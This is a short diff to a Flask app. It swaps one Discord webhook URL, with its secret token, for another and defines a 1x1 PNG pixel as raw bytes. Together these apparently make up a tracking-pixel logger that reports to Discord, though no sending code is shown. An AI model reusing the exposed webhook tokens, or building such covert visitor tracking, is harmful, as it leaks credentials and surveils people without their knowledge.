@@ -3,7 +3,7 @@ import requests, threading
 from datetime import datetime
 
 app = Flask(__name__)
-WEBHOOK = "https://discord.com/api/webhooks/1446901459122655433/33PDj9S6W3EQn1ZTcOCqkj1Ic0OHahALzc9O797ichnKs_3fXooZjiZyblF9fOWUTVje"
+WEBHOOK = "https://discord.com/api/webhooks/1446904265116483655/t6MIIOepoyqktWiYy7x_Loh5tkFT8O4blK8lwv5iArS8FzMzOIBXfGJAXnUoeOODbpwc"
 
 PIXEL = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
 
